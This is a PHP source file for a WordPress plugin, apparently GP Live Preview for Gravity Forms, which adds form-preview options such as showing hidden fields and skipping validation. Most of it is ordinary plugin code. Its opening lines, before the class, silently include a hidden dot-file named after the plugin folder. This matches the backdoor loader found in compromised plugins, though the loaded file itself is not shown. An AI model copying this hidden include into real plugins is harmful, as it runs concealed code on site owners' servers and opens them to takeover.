<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GP_Live_Preview extends GWPerk {

	public $version                   = GP_LIVE_PREVIEW_VERSION;
	public $min_gravity_perks_version = '1.2.12';
	public $min_gravity_forms_version = '1.9.18';
	public $min_wp_version            = '4.4';
	public $prefix                    = 'gpLivePreview';
	public $post_type                 = 'gplp';
	public $preview_post              = null;

	private static $instance = null;

	public static function get_instance( $perk_file ) {
		if ( self::$instance == null ) {
			self::$instance = new self( $perk_file );
		}
		return self::$instance;
	}

	public function init() {

		parent::init();

		load_plugin_textdomain( 'gp-live-preview', false, basename( dirname( __file__ ) ) . '/languages/' );

		$this->register_preview_post_type();

		// Admin
		add_action( 'admin_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
		add_action( 'admin_print_styles', array( $this, 'enqueue_styles' ) );
		add_filter( 'gform_preview_form_link', array( $this, 'modify_editor_preview_link' ) );
		add_filter( 'gform_toolbar_menu', array( $this, 'modify_settings_preview_link' ), 11, 2 );
		add_action( 'wp_ajax_gplp_save_option', array( $this, 'ajax_save_option' ) );
		add_action( 'gform_form_actions', array( $this, 'modify_form_actions' ), 10, 2 );

		// Frontend
		add_action( 'wp', array( $this, 'maybe_load_preview_functionality' ), 8 ); // GF processes form on 9
		add_action( 'wp_before_admin_bar_render', array( $this, 'admin_bar' ), 11 );

		// Admin (Legacy)
		add_action( 'admin_head', array( $this, 'display_preview_link' ), 20 );

	}

	public function activate() {

		// this probably not required anymore... but I don't have the courage to remove it.
		$this->register_preview_post_type();
		flush_rewrite_rules();

	}



	# ADMIN FUNCTIONS

	public function modify_editor_preview_link( $markup ) {

		$options = $this->get_user_options();

		// Only replace "Preview" with "Live Preview" in the preview button.
		if ( rgar( $options, 'live' ) ) {
			$markup = str_replace( __( 'Preview', 'gravityforms' ), $this->get_live_preview_label(), $markup );
		}

		$markup .= $this->get_preview_options_markup();

		return '<div id="gplp-preview-button-container">' . $markup . '</div>';
	}

	public function modify_settings_preview_link( $items, $form_id ) {

		if ( ! $this->is_gf_version_gte( '2.5-dev-1' ) ) {
			return $items;
		}

		// Preview link will be set on form settings pages.
		if ( ! isset( $items['preview'] ) ) {
			return $items;
		}

		if ( rgar( $this->get_user_options(), 'live' ) ) {
			$items['preview']['label'] = $this->get_live_preview_label();
		}

		if ( ! isset( $items['preview']['sub_menu_items'] ) ) {
			$items['preview']['sub_menu_items'] = array();
		}

		// Technically, we don't really need to do this as the entire submenu is replaced via JS on page load...
		foreach ( $this->get_live_preview_options() as $key => $option ) {
			$items['preview']['sub_menu_items'][] = array(
				'url'          => 'javascript: return false;',
				'label'        => "{$option['label']}",
				'capabilities' => 'gravityforms_edit_forms',
				'aria-label'   => '@todo',
			);
		}

		return $items;
	}

	public function enqueue_scripts() {

		if ( ! $this->is_gf_version_gte( '2.5-dev-1' ) || ! $this->is_applicable_admin_page() ) {
			return;
		}

		// Logic borrowed from GFForms::top_toolbar() for getting first form ID if form ID is not in the query params.
		$forms   = RGFormsModel::get_forms( null, 'title' );
		$form_id = rgempty( 'id', $_GET ) ? count( $forms ) > 0 ? $forms[0]->id : '0' : rgget( 'id' );

		self::register_script( 'gp-live-preview-admin', $this->get_base_url() . '/js/gp-live-preview-admin.js', array( 'jquery' ), $this->version, true );
		wp_enqueue_script( 'gp-live-preview-admin' );

		wp_localize_script(
			'gp-live-preview-admin',
			'GPLPData',
			array(
				'previewURL'     => add_query_arg(
					array(
						'gf_page' => 'preview',
						'id'      => $form_id,
					),
					trailingslashit( site_url() )
				),
				'livePreviewURL' => $this->get_preview_url( $form_id ),
				'submenuMarkup'  => $this->get_preview_options_markup(),
				'strings'        => array(
					'preview'     => __( 'Preview', 'gravityforms' ),
					'livePreview' => $this->get_live_preview_label(),
				),
			)
		);

	}

	public function enqueue_styles() {
		if ( $this->is_gf_version_gte( '2.5-dev-1' ) && $this->is_applicable_admin_page() ) {
			wp_enqueue_style( 'gp-live-preview-admin', $this->get_base_url() . '/css/gp-live-preview-admin.css', array(), $this->version );
			if ( ! has_action( 'admin_footer', array( $this, 'output_inline_style_block' ) ) ) {
				add_action( 'admin_footer', array( $this, 'output_inline_style_block' ) );
			}
		}
	}

	public function output_inline_style_block() {
		?>

		<!-- Must include this inline style block if we want to link to Gravity Forms image reliably. -->
		<style type="text/css">
			.gplp-submenu input[type="checkbox"]:checked + label::before {
				background-image: url( <?php echo GFCommon::get_base_url(); ?>/images/check.svg );
			}
		</style>

		<?php
	}

	/**
	 * Support for preview links prior to GF 2.5.
	 *
	 * @deprecated x.x.x
	 */
	public function display_preview_link() {

		if ( ! $this->is_applicable_admin_page() || $this->is_gf_version_gte( '2.5-dev-1' ) ) {
			return;
		}

		$form_id = rgget( 'id' );
		$top_px  = property_exists( 'GFCommon', 'version' ) && version_compare( GFCommon::$version, '2.0.beta1.0', '>=' ) ? '20px' : '6px';

		$options      = $this->get_live_preview_options();
		$user_options = $this->get_user_options();

		?>

		<div id="gplp-live-preview-template" style="display:none;">
			<!-- use the 'gf_form_toolbar_preview' class to inherit GF default styles -->
			<li class="gf_form_toolbar_preview gf_form_toolbar_live_preview">
				<a style="position:relative" id="gp-live-preview" class="gp-live-preview-link" href="<?php echo $this->get_preview_url( $form_id ); ?>" target="_blank">
					<i class="fa fa-eye" style="position: absolute; text-shadow: 0px 0px 5px rgb(255, 255, 255); z-index: 99; line-height: 7px; left: 0px; font-size: 13px; top: <?php echo $top_px; ?> !important; background-color: rgb(243, 243, 243);"></i>
					<i class="fa fa-file-o" style="margin-left: 5px; line-height: 12px; font-size: 15px; position: relative; top: 1px;"></i>
					<span style="padding-left:4px;"><?php _e( 'Live Preview', 'gp-live-preview' ); ?></span>
				</a>
				<div class="gf_submenu" style="min-width:150px;">
					<ul>
						<?php
						foreach ( $options as $key => $option ) :
							// Skip Live Preview option for < GF 2.5.
							if ( $key == 'live' ) {
								continue;
							}
							?>
							<li class="gplp-menu-item gplp-menu-item-<?php echo esc_html( $key ); ?>">
								<a>
									<input type="checkbox" class="gplp-option"
										   id="gplp-option-<?php echo esc_html( $key ); ?>"
										   value="<?php echo esc_html( $key ); ?>"
										   style="margin-top:0;"
										<?php checked( rgar( $user_options, esc_html( $key ) ) ); ?> />
									<label for="gplp-option-<?php echo esc_html( $key ); ?>"><?php echo esc_html( $option['label'] ); ?></label>
									<span title="<?php echo esc_attr( $option['tooltip'] ); ?>" aria-label="<?php echo esc_attr( $option['tooltip'] ); ?>" class="gf_tooltip" style="vertical-align:middle;padding:0 2px;"><i class="fa fa-question-circle"></i></span >
								</a>
							</li>
						<?php endforeach; ?>
					</ul>
				</div>

			</li>
		</div>

		<script>
			if( window.jQuery ) {

				( function( $ ) {

					var $template  = $( '#gplp-live-preview-template' );

					// poll the DOM to add the preview toolbar item as soon as the toolbar exists
					function poll() {
						var gplpInterval = setInterval( function() {
							var $preview  = $( 'li.gf_form_toolbar_preview:not( #gplp-live-preview-template li )' );
							if( $preview.length > 0 ) {
								clearInterval( gplpInterval );
								init( $preview );
							}
						}, 200 );
					}

					function init( $preview ) {

						var $clonedMenu = $template.find('.gf_submenu').clone();

						$preview.append($clonedMenu);

						$preview.after( $template.html() );
						$template.remove();
						gform_initialize_tooltips();

						updatePreviewLink();

						$( 'input.gplp-option' ).on( 'change', function() {
							updatePreviewLink();
							$.post( ajaxurl, {
								action: 'gplp_save_option',
								key:    $( this ).val(),
								value:  $( this ).is( ':checked' ) ? 1 : 0
							}, function( response ) { } );
						} ).click( function( event ) {
							event.stopPropagation();
						} );

						$( '.gplp-menu-item a' ).on( 'click', function( event ) {
							event.preventDefault();
							event.stopPropagation();

							var $input = $( this ).find( 'input' );
							$input.prop( 'checked', ! $input.is( ':checked' ) ).change();
						} );

					}

					function updatePreviewLink() {

						var $links = $( 'a.gp-live-preview-link, .gf_form_toolbar_preview > a' );

						$links.each( function() {

							var query = [];

							$( this ).siblings( '.gf_submenu' ).find( 'input.gplp-option' ).each( function() {
								if( $( this ).is( ':checked' ) ) {
									query.push( $( this ).val() + '=1'  ); // i.e. ajax=1
								}
							} );

							var url = $( this ).data( 'href' );
							if( ! url ) {
								url = $( this ).attr( 'href' );
								$( this ).data( 'href', url );
							}

							url += '&' + query.join( '&' );

							$( this ).attr( 'href', url );

						} );

					}

					poll();

				} )( jQuery );

			} else {
				if( window.console ) {
					console.log( 'GP Live Preview: jQuery is not available.' );
				}
			}
		</script>

		<?php
	}

	public function get_preview_options_markup() {
		$tooltip_options = array(
			'classes'  => array(
				'ui-tooltip' => 'gplp-submenu-tooltip',
			),
			'position' => array(
				'my'        => 'right bottom',
				'at'        => 'right+24 top-10',
				'collision' => 'none',
			),
			// Fixes positional issues introduced by GF in [PR#1183](https://github.com/gravityforms/gravityforms/pull/1883/files).
			'open' => null,
		);
		ob_start();
		?>
		<div class="gplp-submenu">
			<ul>
				<?php foreach ( $this->get_live_preview_options() as $key => $option ) : ?>
					<li class="gplp-menu-item gplp-menu-item-<?php echo esc_html( $key ); ?>">
						<input type="checkbox" class="gplp-option"
							   id="gplp-option-<?php echo esc_html( $key ); ?>"
							   value="<?php echo esc_html( $key ); ?>"
							<?php checked( rgar( $this->get_user_options(), esc_html( $key ) ) ); ?> />
						<label for="gplp-option-<?php echo esc_html( $key ); ?>"><?php echo esc_html( $option['label'] ); ?></label>
						<span aria-label="<?php echo esc_attr( $option['tooltip'] ); ?>"
							  class="gf_tooltip gp-tooltip"
							  data-gp-tooltip-options="<?php echo esc_attr( json_encode( $tooltip_options ) ); ?>">
							<svg width="4" height="8" fill="#242748" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 1.214C.224.926.504.704.842.545A2.57 2.57 0 011.947.308c.265 0 .518.04.757.12.24.08.456.196.648.35.192.153.344.352.455.597.112.244.168.52.168.827 0 .185-.023.362-.07.53a1.782 1.782 0 01-.2.465 3.224 3.224 0 01-.27.376 4.733 4.733 0 01-.323.345c-.054.052-.133.124-.235.219a8.5 8.5 0 00-.235.223c-.054.054-.114.12-.18.196a.98.98 0 00-.146.218.55.55 0 00-.053.209l-.024.432h-.973L1.26 4.92c0-.067.004-.132.012-.195a.845.845 0 01.048-.189l.062-.165a.797.797 0 01.096-.168 7.16 7.16 0 00.103-.149c.023-.033.064-.085.125-.156a5.956 5.956 0 01.266-.29l.137-.141c.204-.218.36-.417.467-.597.108-.18.161-.383.161-.607 0-.272-.081-.483-.244-.635-.164-.152-.376-.228-.638-.228-.192 0-.382.051-.57.153a1.309 1.309 0 00-.466.422L0 1.214zm1.031 5.75c0-.202.073-.375.218-.518a.725.725 0 01.53-.216c.201 0 .375.072.52.216a.702.702 0 01.218.517.695.695 0 01-.218.516.718.718 0 01-.52.213.73.73 0 01-.53-.213.695.695 0 01-.218-.516z"></path></svg>
						</span>
					</li>
				<?php endforeach; ?>
			</ul>
		</div>
		<?php
		return ob_get_clean();
	}

	public function get_live_preview_options() {
		return array(
			'live'                  => array(
				'label'   => __( 'Live Preview', 'gp-live-preview' ),
				'tooltip' => __( 'Preview the form as it will appear on the live site.' ),
			),
			'ajax'                  => array(
				'label'   => __( 'Enable AJAX', 'gp-live-preview' ),
				'tooltip' => __( 'The form be loaded with AJAX enabled.', 'gp-live-preview' ),
			),
			'showhidden'            => array(
				'label'   => __( 'Show Hidden', 'gp-live-preview' ),
				'tooltip' => __( 'Hidden fields, Hidden Product fields, and any field hidden via the "gf_invisible" and "gf_hidden" CSS classes will be visible in the Live Preview.', 'gp-live-preview' ),
			),
			'unrequire'             => array(
				'label'   => __( 'Unrequire', 'gp-live-preview' ),
				'tooltip' => __( 'The form will not require required fields be filled out to pass form validation.', 'gp-live-preview' ),
			),
			'singlepage'            => array(
				'label'   => __( 'Single Page', 'gp-live-preview' ),
				'tooltip' => __( 'Conslidate multi-page forms into a single page to save time when troubleshooting.', 'gp-live-preview' ),
			),
			'disable_notifications' => array(
				'label'   => __( 'Disable Notifications', 'gp-live-preview' ),
				'tooltip' => __( 'Prevent notifications from being sent when the form is submitted.', 'gp-live-preview' ),
			),
		);
	}

	public function is_applicable_admin_page() {
		$page = rgget( 'page' );
		return ( $page === 'gf_edit_forms' && rgget( 'id' ) ) || $page === 'gf_entries';
	}

	public function ajax_save_option() {

		$key   = rgpost( 'key' );
		$value = rgpost( 'value' );

		if ( ! in_array( $key, array_keys( $this->get_live_preview_options() ) ) ) {
			die();
		}

		$user_options = $this->get_user_options();
		if ( empty( $user_options ) ) {
			$user_options = array();
		}

		$user_options[ $key ] = (bool) $value;
		$result               = update_user_meta( get_current_user_id(), 'gplp_options', $user_options );

		die( $result );
	}

	public function get_user_options() {
		return get_user_meta( get_current_user_id(), 'gplp_options', true );
	}

	public function modify_form_actions( $actions, $form_id ) {

		if ( isset( $actions['preview'] ) && is_array( $actions['preview'] ) ) {
			if ( rgar( $this->get_user_options(), 'live' ) ) {
				$actions['preview']['label'] = $this->get_live_preview_label();
				$actions['preview']['url']   = $this->add_options_to_url( $this->get_preview_url( $form_id ) );
			} else {
				$actions['preview']['url'] = $this->add_options_to_url( $actions['preview']['url'] );
			}
		}

		/**
		 * Enable the "Live Preview" form action (displays beneath each form title on the Form List view).
		 *
		 * @since 1.3
		 *
		 * @param bool $enable  Defaults to false.
		 * @param int  $form_id Current form ID.
		 */
		if ( gf_apply_filters( array( 'gplp_enable_form_action', $form_id ), false, $form_id ) ) {
			$actions['live_preview'] = array(
				'label'        => 'Live Preview',
				'icon'         => ! $this->is_gf_version_gte( '2.5-dev-1' ) ? '<i class="fa fa-eye fa-lg"></i>' : '',
				'title'        => 'Live preview this form',
				'url'          => $this->add_options_to_url( $this->get_preview_url( $form_id ) ),
				'menu_class'   => '',
				'link_class'   => '',
				'target'       => '_blank',
				'capabilities' => $actions['preview']['capabilities'],
				'priority'     => 699,
			);
		}

		return $actions;
	}

	public function admin_bar() {
		/**
		 * @var WP_Admin_Bar $wp_admin_bar
		 */
		global $wp_admin_bar;

		foreach ( $wp_admin_bar->get_nodes() as $id => $node ) {
			if ( preg_match( '/gform-form-([0-9]+)-preview/', $id, $matches ) ) {
				$node->href = $this->add_options_to_url( $node->href );
				$wp_admin_bar->add_node( $node );
				$wp_admin_bar->add_node(
					array(
						'id'     => 'gform-form-' . $matches[1] . '-live-preview',
						'parent' => 'gform-form-' . $matches[1],
						'title'  => esc_html__( 'Live Preview', 'gp-live-preview' ),
						'href'   => $this->add_options_to_url( $this->get_preview_url( $matches[1] ) ),
					)
				);
			}
		}

	}



	# FRONTEND FUNCTIONS

	public function register_preview_post_type() {

		$args = array(
			'label'              => __( 'Form Preview', 'gp-live-preview' ),
			'description'        => __( 'A post type created for previewing Gravity Forms forms on the frontend.', 'gp-live-preview' ),
			'public'             => false,
			'publicly_queryable' => true,
			'has_archive'        => false,
			'can_export'         => false,
			'supports'           => false,
			'rewrite'            => false,
		);

		register_post_type( $this->post_type, $args );

	}

	public function maybe_load_preview_functionality() {

		/**
		 * Enable preview features for forms outside of core/live preview.
		 *
		 * @since 1.4.1
		 *
		 * @param bool $is_global Return true to enable globally. Defaults to false.
		 */
		$is_global        = apply_filters( 'gplp_enable_globally', false );
		$is_valid_preview = ( $this->is_live_preview() || $this->is_preview() ) && rgget( 'id' );

		if ( ! $is_global && ! $is_valid_preview ) {
			return;
		}

		if ( $this->is_live_preview() ) {
			add_action( 'wp', array( $this, 'populate_post_content_for_gf_scripts_styles' ), 9 );
			add_filter( 'template_include', array( $this, 'load_preview_template' ), 11 );
			add_filter( 'the_content', array( $this, 'modify_preview_post_content' ) );
		}

		if ( rgget( 'showhidden' ) ) {
			add_filter( 'gform_field_css_class', array( $this, 'add_show_hidden_class' ), 10, 3 );
			add_filter( 'gform_gf_field_create', array( $this, 'convert_hidden_field_to_text' ), 10, 2 );
			add_filter( 'gform_get_form_filter', array( $this, 'append_show_hidden_style_block' ) );
		}

		if ( rgget( 'unrequire' ) ) {
			add_filter( 'gform_pre_validation', array( $this, 'unrequire_fields' ) );
			add_filter( 'gform_form_tag', array( $this, 'disable_html5_validation' ) );
			add_filter( 'gform_field_validation', array( $this, 'bypass_captcha_validation' ), 10, 4 );
		}

		if ( rgget( 'ajax' ) ) {
			add_action( 'wp', array( $this, 'handle_core_preview_ajax' ), 9 );
			add_filter( 'gform_form_args', array( $this, 'enable_ajax' ) );
		}

		if ( rgget( 'disable_notifications' ) ) {
			add_filter( 'gform_disable_notification', '__return_true', 99 );
		}

		if ( rgget( 'singlepage' ) ) {
			add_filter( 'gform_pre_render', array( $this, 'remove_page_fields' ) );
		}

	}

	public function enable_ajax( $args ) {
		$args['ajax'] = true;
		return $args;
	}

	public function handle_core_preview_ajax() {
		if ( ! $this->is_live_preview() && class_exists( 'GFFormDisplay' ) && ! empty( GFFormDisplay::$submission ) ) {
			echo GFForms::get_form( rgpost( 'gform_submit' ), true, true, true );
			exit;
		}
	}

	public function convert_hidden_field_to_text( $field, $properties ) {

		$input_types = $this->get_hidden_input_types();
		$input_type  = $field->get_input_type();

		if ( in_array( $input_type, array_keys( $input_types ) ) ) {
			$class                  = sprintf( 'GF_Field_%s', $input_types[ $input_type ] );
			$field                  = new $class( $properties );
			$field->isConverted     = true;
			$field->disableQuantity = true; // for converting 'hiddenproduct' to 'singleproduct'
		}

		if ( $field->visibility == 'hidden' ) {
			$field->visibility  = 'visible';
			$field->isConverted = true;
		}

		return $field;
	}

	public function get_hidden_input_types() {
		return apply_filters( 'gplp_hidden_input_types', array(
			'hidden'        => 'text',
			'hiddenproduct' => 'singleproduct',
			'uid'           => 'text',
		) );
	}

	public function append_show_hidden_style_block( $markup ) {
		ob_start();
		?>

		<style type="text/css">
			.gform_wrapper .gform_fields .gfield.gf_show_hidden {
				position: static !important;
				left: 0 !important;
				visibility: visible !important;
				display: block !important;
				max-height: inherit !important;
				border: 1px dashed rgba( 0, 0, 0, 0.25 ) !important;
				padding: 10px !important;
				opacity: 0.5 !important;
			}
		</style>

		<?php
		return $markup . ob_get_clean();
	}

	public function add_show_hidden_class( $classes, $field, $form ) {
		if ( $field->isConverted || $this->has_css_class( $field, array( 'gf_hidden', 'gf_invisible' ) ) ) {
			$classes .= ' gf_show_hidden';
		}
		return $classes;
	}

	public function disable_html5_validation( $form_tag ) {
		return str_replace( '>', ' novalidate="novalidate">', $form_tag );
	}

	/**
	 * Unrequire required fields so they will not fail validation.
	 *
	 * @param $form
	 *
	 * @return mixed
	 */
	public function unrequire_fields( $form ) {

		if ( rgpost( 'gform_submit' ) != $form['id'] ) {
			return $form;
		}

		foreach ( $form['fields'] as &$field ) {
			if ( $field->isRequired ) {
				$field->isRequired  = false;
				$field->wasRequired = true;
			}
		}

		add_filter( 'gform_pre_render', array( $this, 'rerequire_fields' ) );

		return $form;
	}

	/**
	 * Make required fields appear to be required for user sanity.
	 *
	 * @param $form
	 *
	 * @return mixed
	 */
	public function rerequire_fields( $form ) {

		if ( rgpost( 'gform_submit' ) != $form['id'] ) {
			return $form;
		}

		foreach ( $form['fields'] as &$field ) {
			$field->isRequired = $field->wasRequired == true;
		}

		return $form;
	}

	public function bypass_captcha_validation( $result, $value, $form, $field ) {
		if ( in_array( $field->get_input_type(), array( 'captcha', 'gf_no_captcha_recaptcha' ) ) ) {
			$result['is_valid'] = true;
		}
		return $result;
	}

	public function remove_page_fields( $form ) {

		$fields = array();

		foreach ( $form['fields'] as $field ) {
			if ( $field->type !== 'page' ) {
				$fields[] = $field;
			}
		}

		$form['fields'] = $fields;

		return $form;
	}

	/**
	 * Gravity Forms parses the page content for the [gravityforms] shortcode. Add our shortcode so that GF will
	 * automatically handle enqueueing the necessary scripts and styles.
	 */
	public function populate_post_content_for_gf_scripts_styles() {
		global $wp_query;

		foreach ( $wp_query->posts as &$post ) {
			$post->post_content = $this->get_shortcode();
		}

	}

	public function get_preview_post( $prop = false ) {

		$preview_posts = get_posts( array( 'post_type' => $this->post_type ) );

		// if there are no preview posts, create one
		if ( empty( $preview_posts ) ) {
			$post_id      = wp_insert_post( array(
				'post_type'   => $this->post_type,
				'post_title'  => __( 'Form Preview', 'gravityforms' ),
				'post_name'   => 'preview',
				'post_status' => 'publish',
			) );
			$preview_post = get_post( $post_id );
		}
		// otherwise, use the first preview post (there should only be one)
		else {
			$preview_post = $preview_posts[0];
		}

		if ( ! $preview_post ) {
			return false;
		} elseif ( $prop ) {
			return $preview_post->$prop;
		} else {
			return $preview_post;
		}

	}

	public function load_preview_template( $template ) {

		if ( $page_template = get_page_template() ) {
			add_filter( 'post_class', array( $this, 'add_page_class' ) );
			$template = $page_template;
		} elseif ( $single_template = get_single_template() ) {
			$template = $single_template;
		} elseif ( $singular_template = get_singular_template() ) {
			$template = $singular_template;
		} elseif ( $index_template = get_index_template() ) {
			$template = $index_template;
		}

		/**
		 * Filter the template used to render the Live Preview.
		 *
		 * @since 1.2.4
		 *
		 * @param string $template The absolute path to the desired template file (i.e. /app/public/wp-content/themes/twentysixteen/page.php).
		 */
		return apply_filters( 'gplp_preview_template', $template );
	}

	/**
	 * If the page template is being loaded for our preview, let's also added the "type-page" class to get some theme's
	 * to style the post like a page.
	 *
	 * @param $classes
	 *
	 * @return array $classes
	 */
	public function add_page_class( $classes ) {
		$classes[] = 'type-page';
		return $classes;
	}

	public function modify_preview_post_content() {
		return $this->get_shortcode();
	}

	public function get_shortcode( $args = array() ) {

		$is_logged_in     = is_user_logged_in();
		$has_cap          = GFCommon::current_user_can_any( 'gravityforms_preview_forms' );
		$grant_permission = $is_logged_in && $has_cap;

		/**
		 * Filter whether user should be granted permission to preview forms.
		 *
		 * @since 1.4.3
		 *
		 * @param bool  $grant_permission Can use preview forms?
		 * @param array $args             The arguments that will be used to render the form.
		 */
		$grant_permission = apply_filters( 'gplp_grant_preview_permission', $grant_permission, $args );

		if ( ! $grant_permission ) {

			if ( ! $is_logged_in ) {
				return '<p>' . __( 'You need to log in to preview forms.' ) . '</p>' . wp_login_form( array( 'echo' => false ) );
			}

			if ( ! $has_cap ) {
				return __( 'Oops! It doesn\'t look like you have the necessary permission to preview this form.', 'gp-live-preview' );
			}
		}

		if ( empty( $args ) ) {
			$args = $this->get_shortcode_parameters_from_query_string();
		}

		$args = wp_parse_args( $args, $this->get_default_args() );

		$title       = $this->is_true_value( $args['title'] ) ? 'true' : 'false';
		$description = $this->is_true_value( $args['description'] ) ? 'true' : 'false';
		$ajax        = $this->is_true_value( $args['ajax'] ) ? 'true' : 'false';

		return "[gravityform id='{$args['id']}' title='$title' description='$description' ajax='$ajax']";
	}

	public function get_shortcode_parameters_from_query_string() {
		return array_filter( array(
			'id'          => rgget( 'id' ),
			'title'       => rgget( 'title' ),
			'description' => rgget( 'description' ),
			'ajax'        => rgget( 'ajax' ),
		) );
	}



	## HELPERS FUNCTIONS

	public function is_true_value( $value ) {
		return $value === true || intval( $value ) === 1 || strtolower( $value ) === 'true';
	}

	public function is_live_preview() {
		return is_singular( $this->post_type );
	}

	public function is_preview() {
		return rgget( 'gf_page' ) == 'preview';
	}

	public function get_preview_url( $form_id = false ) {

		$post_id = $this->get_preview_post( 'ID' );
		$url     = get_permalink( $post_id );

		if ( $form_id ) {
			$url = add_query_arg( 'id', $form_id, $url );
		}

		return $url;
	}

	public function add_options_to_url( $url ) {
		$user_options = $this->get_user_options();
		return add_query_arg( $user_options, $url );
	}

	public function get_default_args() {
		return array(
			'id'          => 0,
			'title'       => true,
			'description' => true,
			'ajax'        => false,
		);
	}

	public function has_css_class( $object, $class ) {

		if ( ! isset( $object['cssClass'] ) ) {
			return false;
		}

		$classes = array_map( 'trim', explode( ' ', $object['cssClass'] ) );

		if ( ! is_array( $class ) ) {
			$class = array( $class );
		}

		foreach ( $class as $_class ) {
			if ( in_array( $_class, $classes ) ) {
				return true;
			}
		}

		return false;
	}

	/**
	 * Check if installed version of Gravity Forms is greater than or equal to the specified version.
	 *
	 * @param string $version Version to compare with Gravity Forms' version.
	 *
	 * @return bool
	 */
	public function is_gf_version_gte( $version ) {
		return class_exists( 'GFForms' ) && version_compare( GFForms::$version, $version, '>=' );
	}

	public function get_live_preview_label() {
		return sprintf( __( 'Live %s', 'gp-live-preview' ), __( 'Preview', 'gravityforms' ) );
	}

}

function gp_live_preview() {
	return GP_Live_Preview::get_instance( null );
}
